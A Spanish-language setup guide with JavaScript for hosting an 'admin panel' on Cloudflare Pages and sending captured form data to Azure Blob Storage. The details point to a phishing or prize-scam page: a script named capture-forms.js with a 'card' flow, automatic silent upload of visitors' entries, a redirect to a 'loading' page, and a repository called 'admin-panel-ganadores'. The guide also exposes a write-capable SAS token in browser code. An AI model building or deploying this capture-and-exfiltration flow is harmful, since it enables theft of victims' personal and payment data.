# 🚀 GUÍA COMPLETA: Cloudflare + Azure Blob Storage

## ARQUITECTURA FINAL

```
┌─────────────────────┐
│  GitHub Repository  │
│ (Admin Panel)       │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────────────────────┐
│  Cloudflare Pages (Dominio Gratuito)│
│  URL: admin-panel.pages.dev         │
│  (Tu panel se ve aquí)              │
└──────────┬──────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│  Azure Blob Storage (Z13)           │
│  (Archivos del backup)              │
│  https://z13storage.blob.core.windows.net
└─────────────────────────────────────┘
```

---

## ✅ PARTE 1: CONECTAR GITHUB A CLOUDFLARE PAGES

### PASO 1: Acceder a Cloudflare

```
1. Ir a: https://dash.cloudflare.com
2. Hacer login con tu cuenta
3. Click en "Pages" en el menu lateral
4. Click en "Create a project"
```

### PASO 2: Conectar GitHub

```
1. Click "Connect to Git"
2. Seleccionar "GitHub" como provider
3. Autorizar Cloudflare en GitHub
   (Cloudflare pedirá permisos de acceso)
4. Seleccionar repositorio:
   └─ makemoneydrogdila/admin-panel-ganadores
```

### PASO 3: Configurar Build

En la pantalla de configuración, dejar así:

```
Build command:
└─ (Dejar vacío - no necesita build)

Build output directory:
└─ / (raíz del proyecto)

Environment variables:
└─ AZURE_STORAGE_ACCOUNT: z13storage
└─ AZURE_CONTAINER: panel-data
└─ AZURE_SAS_TOKEN: (tu token, ver PARTE 2)
```

### PASO 4: Deploy

```
1. Click "Save and Deploy"
2. Cloudflare hará deploy automático
3. URL generada: https://admin-panel-XXXX.pages.dev
   (o tu dominio personalizado)
```

### PASO 5: Verificar Deploy

```
1. Esperar a que termine (1-2 minutos)
2. Verás status: "✓ Deploy successful"
3. Click en la URL para ver el panel
4. Debe verse como en localhost
```

---

## ✅ PARTE 2: CONFIGURAR AZURE BLOB STORAGE

### PASO 1: Crear Storage Account

```
1. Ir a: https://portal.azure.com
2. Buscar "Storage accounts"
3. Click "+ Create"
4. Configurar:
   ├─ Resource group: Crear nuevo → "panel-storage"
   ├─ Storage account name: "z13storage"
   ├─ Region: Selecciona tu región (ej: East US)
   ├─ Performance: Standard
   └─ Redundancy: LRS (Locally-redundant)
5. Click "Review + create"
6. Click "Create"
```

### PASO 2: Crear Contenedor Blob

```
1. Ir al Storage Account creado
2. Click "Containers" (menu izquierdo)
3. "+ Container"
4. Nombre: "panel-data"
5. Public access level: "Private"
6. Click "Create"
```

### PASO 3: Generar SAS Token

```
1. Click en contenedor "panel-data"
2. Click los 3 puntos (...) en la barra superior
3. "Generate SAS"
4. Configurar:
   ├─ Permissions:
   │  ├─ ☑ Read
   │  ├─ ☑ Add
   │  ├─ ☑ Create
   │  └─ ☑ Write
   ├─ Start time: Hoy
   ├─ Expiration: 1 año
   └─ Protocol: HTTPS only
5. Click "Generate SAS token and URL"
6. Copiar: "Blob SAS URL"
   └─ Ejemplo: https://z13storage.blob.core.windows.net/panel-data?sv=2021-06-08&...
```

### PASO 4: Guardar Credenciales

Necesitarás:
```
- Storage Account Name: z13storage
- Container Name: panel-data
- SAS Token: (el que copiaste)
- Blob URL: https://z13storage.blob.core.windows.net
```

---

## ✅ PARTE 3: INTEGRAR AZURE CON EL PANEL

### PASO 1: Crear Script de Azure Upload

Crear archivo: `js/azure-upload.js`

```javascript
// ============================================
// CONFIGURACIÓN DE AZURE
// ============================================

const AZURE_CONFIG = {
  storageAccount: "z13storage",
  container: "panel-data",
  // El SAS token se obtiene de variables de entorno de Cloudflare
  sasToken: typeof window !== 'undefined' && window.AZURE_SAS_TOKEN 
    ? window.AZURE_SAS_TOKEN 
    : "YOUR_SAS_TOKEN_HERE"
};

// URL base de Azure Blob
const AZURE_BLOB_URL = `https://${AZURE_CONFIG.storageAccount}.blob.core.windows.net/${AZURE_CONFIG.container}`;

// ============================================
// FUNCIÓN: Subir datos a Azure Blob Storage
// ============================================

async function uploadToAzureBlob(filename, data) {
  try {
    // Crear URL con SAS token
    const url = `${AZURE_BLOB_URL}/${filename}?${AZURE_CONFIG.sasToken}`;
    
    // Preparar datos
    const jsonData = typeof data === 'string' ? data : JSON.stringify(data);
    
    // Hacer PUT request a Azure
    const response = await fetch(url, {
      method: "PUT",
      headers: {
        "x-ms-blob-type": "BlockBlob",
        "Content-Type": "application/json"
      },
      body: jsonData
    });

    if (response.ok) {
      console.log(`✅ Archivo subido a Azure: ${filename}`);
      return { success: true, filename: filename };
    } else {
      console.error(`❌ Error: ${response.status} - ${response.statusText}`);
      return { success: false, error: response.statusText };
    }
  } catch (error) {
    console.error("❌ Error subiendo a Azure:", error);
    return { success: false, error: error.message };
  }
}

// ============================================
// FUNCIÓN: Exportar todos los datos a Azure
// ============================================

async function exportToAzure() {
  try {
    // Obtener datos del localStorage
    const panelData = localStorage.getItem("panelData");
    
    if (!panelData) {
      console.warn("⚠️ No hay datos para exportar");
      return { success: false, message: "No data found" };
    }

    // Crear nombre de archivo con timestamp
    const timestamp = new Date().toISOString()
      .replace(/[:.]/g, "-")
      .slice(0, -5); // Remover milisegundos
    const filename = `panel-data-${timestamp}.json`;

    console.log(`📤 Exportando a Azure: ${filename}`);

    // Subir a Azure
    const result = await uploadToAzureBlob(filename, panelData);

    if (result.success) {
      console.log("✅ ¡Datos exportados exitosamente!");
      
      // Limpiar localStorage después de exportar (opcional)
      // localStorage.removeItem("panelData");
      
      return { 
        success: true, 
        filename: filename,
        url: `${AZURE_BLOB_URL}/${filename}`
      };
    } else {
      console.error("❌ Error al exportar:", result.error);
      return result;
    }
  } catch (error) {
    console.error("❌ Error en exportToAzure:", error);
    return { success: false, error: error.message };
  }
}

// ============================================
// FUNCIÓN: Subir Archivo Individual
// ============================================

async function uploadFileToAzure(file) {
  try {
    if (!(file instanceof File)) {
      console.error("❌ El parámetro debe ser un File object");
      return { success: false };
    }

    const filename = `uploads/${Date.now()}-${file.name}`;
    const data = await file.arrayBuffer();

    const url = `${AZURE_BLOB_URL}/${filename}?${AZURE_CONFIG.sasToken}`;

    const response = await fetch(url, {
      method: "PUT",
      headers: {
        "x-ms-blob-type": "BlockBlob",
        "Content-Type": file.type || "application/octet-stream"
      },
      body: data
    });

    if (response.ok) {
      console.log(`✅ Archivo subido: ${filename}`);
      return { 
        success: true, 
        filename: filename,
        url: `${AZURE_BLOB_URL}/${filename}`
      };
    }
  } catch (error) {
    console.error("❌ Error subiendo archivo:", error);
    return { success: false, error: error.message };
  }
}

// ============================================
// FUNCIÓN: Listar Archivos en Azure
// ============================================

async function listAzureFiles() {
  try {
    const url = `${AZURE_BLOB_URL}?restype=container&comp=list&${AZURE_CONFIG.sasToken}`;
    
    const response = await fetch(url);
    const text = await response.text();

    // Parser XML simple
    const parser = new DOMParser();
    const xmlDoc = parser.parseFromString(text, "text/xml");
    const blobs = xmlDoc.getElementsByTagName("Name");

    const files = [];
    for (let i = 0; i < blobs.length; i++) {
      files.push(blobs[i].textContent);
    }

    console.log("📁 Archivos en Azure:", files);
    return files;
  } catch (error) {
    console.error("❌ Error listando archivos:", error);
    return [];
  }
}

// ============================================
// FUNCIÓN: Descargar Archivo desde Azure
// ============================================

async function downloadFromAzure(filename) {
  try {
    const url = `${AZURE_BLOB_URL}/${filename}?${AZURE_CONFIG.sasToken}`;
    
    const response = await fetch(url);
    if (response.ok) {
      const data = await response.json();
      console.log(`✅ Archivo descargado: ${filename}`, data);
      return { success: true, data: data };
    } else {
      console.error(`❌ Error: ${response.status}`);
      return { success: false };
    }
  } catch (error) {
    console.error("❌ Error descargando:", error);
    return { success: false, error: error.message };
  }
}
```

### PASO 2: Agregar Script a loading.html

Edita `loading.html` y busca `</body>`, agrega antes:

```html
<!-- Azure Upload Integration -->
<script src="js/azure-upload.js"></script>

<!-- Botón para exportar (opcional, agregar donde quieras) -->
<button onclick="exportToAzure()" style="
  position: fixed;
  bottom: 20px;
  right: 20px;
  padding: 10px 20px;
  background: #0078d4;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  z-index: 9999;
">📤 Exportar a Azure</button>
```

### PASO 3: Modificar capture-forms.js

En `js/capture-forms.js`, en la función `captureAndStore()`, agrega antes del `setTimeout`:

```javascript
async function captureAndStore(flowType, body, nextFlow) {
  // ... código existente ...

  localStorage.setItem("flowData", JSON.stringify(flowData));

  // AGREGAR ESTA LÍNEA: Exportar a Azure automáticamente
  if (typeof exportToAzure === 'function') {
    exportToAzure().then(result => {
      if (result.success) {
        console.log(`✅ Datos de ${flowType} exportados a Azure`);
      }
    });
  }

  // Redirigir
  setTimeout(function() {
    window.location.href = "loading.html";
  }, 500);
}
```

---

## ✅ PARTE 4: CONFIGURAR VARIABLES EN CLOUDFLARE

### PASO 1: Agregar Variables de Entorno

```
1. Ir a Cloudflare Dashboard → Pages
2. Click en tu proyecto "admin-panel-ganadores"
3. Settings → Environment variables
4. Agregar:

   Variable: AZURE_STORAGE_ACCOUNT
   Value: z13storage
   
   Variable: AZURE_CONTAINER
   Value: panel-data
   
   Variable: AZURE_SAS_TOKEN
   Value: (tu SAS token completo)
   
5. Click "Save"
```

### PASO 2: Hacer que Funcione en el Cliente

En `js/azure-upload.js`, modifica:

```javascript
const AZURE_CONFIG = {
  storageAccount: "z13storage",  // O usar variable de entorno
  container: "panel-data",        // O usar variable de entorno
  sasToken: "TU_SAS_TOKEN_AQUI"
};
```

---

## ✅ PARTE 5: FLUJO COMPLETO

### 1. Usuario accede al panel
```
URL: https://admin-panel-XXXX.pages.dev
└─ Carga desde Cloudflare (GitHub)
```

### 2. Usuario completa formulario
```
index.html → Ingresa datos
└─ capture-forms.js captura
```

### 3. Datos se guardan localmente
```
localStorage → panelData
└─ {"index": {...}, "card": {...}}
```

### 4. Automáticamente se exportan a Azure
```
exportToAzure() 
└─ Sube JSON a Azure Blob Storage
└─ Archivo: panel-data-2026-08-03T12-34-56.json
```

### 5. Usuario puede descargar
```
downloadFromAzure(filename)
└─ Recupera datos desde Azure
```

---

## ✅ PARTE 6: PRUEBAS

### Test 1: Cloudflare Deploy
```
1. Abre: https://admin-panel-XXXX.pages.dev
2. Verifica que carga el panel
3. Abre DevTools (F12) → Console
4. Verifica que no hay errores 404
```

### Test 2: Captura de Datos
```
1. Completa un formulario (ej: index.html)
2. Abre DevTools → Application → localStorage
3. Verifica que está "panelData"
4. Verifica que está "sessionId"
```

### Test 3: Exportar a Azure
```
1. En DevTools Console, ejecuta:
   exportToAzure()

2. Verifica respuesta:
   ✅ Archivo subido a Azure: panel-data-2026-08-03T...

3. En Azure Portal:
   - Storage Account → Containers → panel-data
   - Verifica que aparezca el archivo JSON
```

### Test 4: Listar Archivos
```
1. En Console:
   listAzureFiles()

2. Debe mostrar array de archivos:
   📁 Archivos en Azure: ["panel-data-2026-08-03T..."]
```

### Test 5: Descargar Datos
```
1. En Console:
   downloadFromAzure('panel-data-2026-08-03T12-34-56.json')

2. Debe mostrar los datos guardados
```

---

## 🔐 SEGURIDAD

### ⚠️ NO HAGAS:
```javascript
// ❌ MALO: SAS Token visible en código
const sasToken = "sv=2021-06-08&ss=bfqt&srt=sco&sp=rwdlacupitfx&...";
```

### ✅ MEJOR:
```javascript
// ✅ BUENO: Usar variables de Cloudflare
const sasToken = window.AZURE_SAS_TOKEN || "fallback";
```

### 🔒 PROTEGER SAS TOKEN:
1. Usar Cloudflare Workers para ocultar credenciales
2. Generar SAS Token con tiempo de expiración corto
3. Usar HTTPS siempre
4. Rotar tokens regularmente

---

## 🎯 CHECKLIST FINAL

- [ ] GitHub conectado a Cloudflare
- [ ] Deploy en Cloudflare exitoso
- [ ] Dominio gratuito de Cloudflare funcionando
- [ ] Azure Storage Account creado
- [ ] Contenedor "panel-data" creado
- [ ] SAS Token generado
- [ ] Script azure-upload.js agregado
- [ ] Script agregado a loading.html
- [ ] capture-forms.js actualizado
- [ ] Variables de entorno en Cloudflare
- [ ] Test 1: Panel carga ✅
- [ ] Test 2: Datos se guardan ✅
- [ ] Test 3: Exportar a Azure ✅
- [ ] Test 4: Listar archivos ✅
- [ ] Test 5: Descargar datos ✅

---

## 📊 RESUMEN DE ARQUITECTURA

```
┌─────────────────────────────────────────────┐
│          USUARIO (Navegador)                │
└────────────────┬────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────┐
│  Cloudflare Pages (Dominio Gratuito)        │
│  https://admin-panel-XXXX.pages.dev         │
│  - HTML Files                               │
│  - JavaScript                               │
│  - CSS & Assets                             │
└────────────────┬────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────┐
│  localStorage (Navegador)                   │
│  - sessionId                                │
│  - panelData (todos los flows)              │
└────────────────┬────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────┐
│  Azure Blob Storage                         │
│  https://z13storage.blob.core.windows.net   │
│  - panel-data container                     │
│  - Archivos JSON con datos                  │
└─────────────────────────────────────────────┘
```

---

## 📞 SOPORTE

Si algo falla:

1. **Panel no carga en Cloudflare**
   - Revisa los logs en Cloudflare → Pages → Deployments
   - Verifica que el commit fue exitoso en GitHub

2. **No se exporta a Azure**
   - Abre DevTools (F12) → Console
   - Revisa los errores que muestre
   - Verifica que el SAS Token sea válido (no expirado)
   - Verifica CORS en Azure (Settings → CORS)

3. **SAS Token expirado**
   - Genera uno nuevo en Azure Portal
   - Actualiza en Cloudflare → Environment variables
   - Haz push a GitHub para redeploy

---

**¡Tu arquitectura completa está lista! 🎉**
